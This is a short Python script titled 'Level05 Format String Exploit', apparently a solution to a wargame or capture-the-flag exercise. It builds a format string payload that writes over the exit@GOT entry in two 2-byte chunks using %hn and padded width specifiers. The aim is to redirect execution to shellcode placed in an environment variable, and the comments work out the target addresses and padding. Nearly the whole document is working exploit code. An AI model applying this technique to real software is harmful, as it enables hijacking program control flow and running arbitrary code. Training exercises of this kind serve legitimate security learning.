#!/usr/bin/env python
# Level05 Format String Exploit
# Overwrites exit@GOT with address of shellcode in environment variable

# exit@GOT addresses (write in two 2-byte chunks)
exit_low  = '\x08\x04\x97\xe0'[::-1]  # 0x080497e0
exit_high = '\x08\x04\x97\xe2'[::-1]  # 0x080497e2

# Shellcode address: 0xffffd87c (found empirically)
# Low bytes:  0xd87c = 55420
# High bytes: 0xffff = 65535

# Padding calculations:
# First write:  55420 - 8 (addresses) = 55412
# Second write: 65535 - 55420 = 10115

payload = exit_low + exit_high + '%55412d%10$hn' + '%10115d%11$hn'
print payload
